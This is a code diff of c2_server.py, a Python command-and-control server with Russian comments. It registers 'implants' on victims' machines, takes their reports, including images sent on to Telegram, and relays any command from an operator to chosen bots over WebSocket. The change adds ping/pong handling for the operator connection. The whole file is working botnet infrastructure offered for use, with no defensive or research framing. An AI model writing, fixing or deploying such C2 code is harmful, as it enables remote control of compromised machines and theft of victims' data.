@@ -1,5 +1,5 @@
-# --- ФАЙЛ: c2_server.py (Финальный, исправленный, рабочий) ---
-# Исправлена фундаментальная ошибка: сервер теперь пересылает ВСЕ типы сообщений.
+# --- ФАЙЛ: c2_server.py (Финальная версия с ответом на ping) ---
+# Исправлена фундаментальная ошибка: сервер теперь отвечает на ping от оператора.
 
 import asyncio, json, os, threading, base64
 import requests
@@ -9,7 +9,6 @@ import settings
 IMPLANTS, OPERATOR = {}, None
 
 def send_telegram_photo(caption, photo_data):
-    """Отправляет base64 изображение в Telegram."""
     def send():
         try:
             image_bytes = base64.b64decode(photo_data)
@@ -27,7 +26,6 @@ async def broadcast_bot_list():
         await OPERATOR.send_json({'type': 'bot_list', 'data': bot_list})
 
 async def report_handler(request):
-    """Принимает донесения от имплантов по HTTP POST."""
     try:
         data = await request.json()
         bot_id = data.get('bot_id')
@@ -45,6 +43,7 @@ async def report_handler(request):
 
 async def websocket_handler(request):
     global OPERATOR, IMPLANTS
+    # aiohttp сам обрабатывает heartbeat от имплантов, но пинги от оператора - наша задача.
     ws = web.WebSocketResponse(heartbeat=25.0)
     await ws.prepare(request)
     client_type, client_id = None, None
@@ -53,28 +52,24 @@ async def websocket_handler(request):
         initial_msg = await ws.receive_json(timeout=30.0)
         client_type = initial_msg.get('type')
 
-        if client_type == 'operator':
-            OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list()
-        elif client_type == 'implant' and 'id' in initial_msg:
-            client_id = initial_msg.get('id')
-            IMPLANTS[client_id] = ws; print(f"[+] Имплант на связи: {client_id}"); await broadcast_bot_list()
-        else:
-            await ws.close(); return ws
+        if client_type == 'operator': OPERATOR = ws; print("[+] Оператор подключился."); await broadcast_bot_list()
+        elif client_type == 'implant' and 'id' in initial_msg: client_id = initial_msg.get('id'); IMPLANTS[client_id] = ws; print(f"[+] Имплант на связи: {client_id}"); await broadcast_bot_list()
+        else: await ws.close(); return ws
 
         async for msg in ws:
-            if msg.type != web.WSMsgType.TEXT or msg.data == 'pong': continue
-            try: data = json.loads(msg.data)
-            except: continue
+            if msg.type == web.WSMsgType.TEXT:
+                # <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ: ОТВЕЧАЕМ НА "ЛАЙ" СТОРОЖЕВОГО ПСА >>>
+                if msg.data == 'ping':
+                    await ws.send_str('pong')
+                    continue
 
-            if client_type == 'operator':
-                target_id = data.get('target_id')
-                if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
-                    # <<< ГЛАВНОЕ ИСПРАВЛЕНИЕ: ТУПАЯ ПЕРЕСЫЛКА >>>
-                    # Теперь мы пересылаем ЛЮБОЕ сообщение, а не только 'command'.
-                    # Если это команда - имплант получит {'type':'command', 'payload':{...}}
-                    # Если это запрос деталей - {'type':'get_details', 'target_id':'...'}
-                    # Имплант знает, как это обработать.
-                    await IMPLANTS[target_id].send_json(data)
+                try: data = json.loads(msg.data)
+                except: continue
+
+                if client_type == 'operator':
+                    target_id = data.get('target_id')
+                    if target_id in IMPLANTS and not IMPLANTS[target_id].closed:
+                        await IMPLANTS[target_id].send_json(data)
 
     except Exception: pass
     finally:
